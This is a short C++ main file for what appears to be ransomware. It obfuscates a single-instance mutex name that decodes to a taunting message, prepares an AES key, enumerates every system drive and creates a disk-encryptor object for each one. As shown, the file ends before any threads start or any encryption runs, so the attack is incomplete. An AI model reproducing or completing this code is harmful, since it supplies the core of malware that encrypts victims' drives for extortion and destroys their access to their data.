#include <iostream>
#include <thread>

#include "headers.h"
#include "systeme.h"
#include "diskEncryptor.h"
#include "aes.h"


int main(void) {

	HANDLE hMutex = CreateMutexA(NULL, TRUE, AY_OBFUSCATE("b29wc2llIHRoYXRzIHNhZCBmb3IgeW91IF5e"));
	if (ERROR_ALREADY_EXISTS == GetLastError()) {
		return 1;
	}

	std::vector<std::thread> threads;
	std::vector<DiskEncryptor> toEncrypt;

	AESKey aes;
	Systeme sys;
	std::vector<std::string> drives = sys.getDrives();

	for (std::string drive : drives) {
		DiskEncryptor diskEncryptor(drive);
		toEncrypt.push_back(diskEncryptor);
	}

	


	
	return 0;
}